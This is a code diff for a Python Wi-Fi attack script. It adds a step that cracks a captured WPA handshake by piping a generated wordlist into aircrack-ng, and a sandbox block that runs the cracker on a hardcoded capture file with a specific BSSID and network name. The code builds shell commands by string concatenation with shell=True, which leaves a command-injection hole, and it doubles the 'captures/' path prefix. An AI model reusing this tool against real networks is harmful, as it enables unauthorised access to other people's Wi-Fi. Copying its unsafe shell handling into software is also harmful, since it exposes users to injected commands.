@@ -350,16 +350,20 @@ def attack(target, clients):
         t.sleep(3)
     process_1.send_signal(signal.SIGINT)
     print(Fore.YELLOW, 'Checking handshake')
-    verifyHandshake(BSSID)
+    verifyHandshake(BSSID,target)
     t.sleep(2)
     # TODO: verifyHandshake() 
 
-def verifyHandshake(BSSID):
+def findCapFile(BSSID):
     # --------- Find handshake capture file ---------
     process = sp.run(['ls captures | grep '+BSSID], capture_output=True, text=True, shell=True)
     ls = process.stdout.splitlines()
     # Get the latest handshake file
     handshakeFile = 'captures/' + ls[-1]
+    return handshakeFile
+
+def verifyHandshake(BSSID,target):
+    handshakeFile = findCapFile(BSSID)
     # --------- Verify handshake ---------
     command = ['pyrit', '-r', handshakeFile, 'analyze']
     process_1 = sp.run(command, capture_output=True, text=True)
@@ -369,8 +373,16 @@ def verifyHandshake(BSSID):
         print(Fore.LIGHTGREEN_EX, '| PASSWORD CAPTURED! |')
         print(Fore.LIGHTGREEN_EX, '+--------------------+\n')
         monitorToggle(getInterface(0),1)
+        t.sleep(2)
+        crackPassword(handshakeFile,target)
     else:
         print(Fore.LIGHTYELLOW_EX,'Password not captured, likely not enough clients connected - try again with another network')
+
+def crackPassword(file,target):
+    Name = target[3]
+    capFile = 'captures/'+file
+    command = 'python3 wordlist.py | aircrack-ng -w - '+ capFile + ' -e ' + Name
+    crackProc = sp.Popen(command, shell=True)
 
 
 def start():
@@ -379,11 +391,11 @@ def start():
 
 # Main function calls
 welcome()       # prints title
-start()         # Start the process/function/procedure tree
+# start()         # Start the process/function/procedure tree
 
 # -------SANDBOX--------
-# readFile()
+filename = 'capture_7C:DB:98:B4:5D:59_MySpectrumWiFi5B-2G-01.cap'
+targetlist = ['7C:DB:98:B4:5D:59', '-54', '10', 'MySpectrumWiFi5B-2G']
+crackPassword(filename,targetlist)
 
-# monitorToggle(getInterface(0),1)
-
-# findTargetWash()
+# captures/capture_7C:DB:98:B4:5D:59_MySpectrumWiFi5B-2G-01.cap
